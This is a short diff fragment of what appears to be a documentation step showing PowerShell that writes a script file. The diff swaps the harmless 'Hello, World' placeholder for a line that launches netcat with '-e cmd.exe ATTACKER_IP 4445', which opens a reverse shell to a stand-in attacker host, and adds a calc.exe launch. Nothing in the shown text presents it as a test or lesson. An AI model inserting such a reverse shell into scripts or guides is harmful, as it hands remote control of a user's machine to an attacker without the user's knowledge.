@@ -11,8 +11,8 @@
 ```
 4. `$scriptPath = 'C:\Path\to\directory\script.ps1'
 $scriptContent = @"
-# Your PowerShell script content goes here
-Write-Host 'Hello, World!'
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+C:\Windows\System32\calc.exe
 "@
 Set-Content -Path $scriptPath -Value $scriptContent
 `
